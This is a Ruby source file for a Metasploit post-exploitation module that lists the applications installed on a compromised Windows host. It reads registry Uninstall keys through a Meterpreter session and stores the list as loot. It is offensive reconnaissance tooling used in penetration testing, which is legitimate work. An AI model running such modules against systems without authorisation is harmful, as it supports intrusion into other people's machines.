# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Windows Gather Installed Application Enumeration',
                      'Description'   => %q( This module will enumerate all installed applications ),
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]))
  end

  def app_list
    tbl = Rex::Text::Table.new(
      'Header'  => "Installed Applications",
      'Indent'  => 1,
      'Columns' =>
      [
        "Name",
        "Version"
      ]
    )
    appkeys = [
      'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      'HKLM\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
      'HKCU\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'
    ]
    apps = []
    appkeys.each do |keyx86|
      found_keys = registry_enumkeys(keyx86)
      next unless found_keys
      found_keys.each do |ak|
        apps << keyx86 + "\\" + ak
      end
    end

    t = []
    until apps.empty?

      1.upto(16) do
        t << framework.threads.spawn("Module(#{refname})", false, apps.shift) do |k|
          begin
            dispnm = registry_getvaldata(k.to_s, "DisplayName")
            dispversion = registry_getvaldata(k.to_s, "DisplayVersion")
            tbl << [dispnm, dispversion] if dispnm && dispversion
          rescue
          end
        end
      end
      t.map(&:join)
    end

    results = tbl.to_s

    print_line("\n" + results + "\n")

    p = store_loot("host.applications", "text/plain", session, results, "applications.txt", "Installed Applications")
    print_status("Results stored in: #{p}")
  end

  def run
    print_status("Enumerating applications installed on #{sysinfo['Computer']}")
    app_list
  end
end
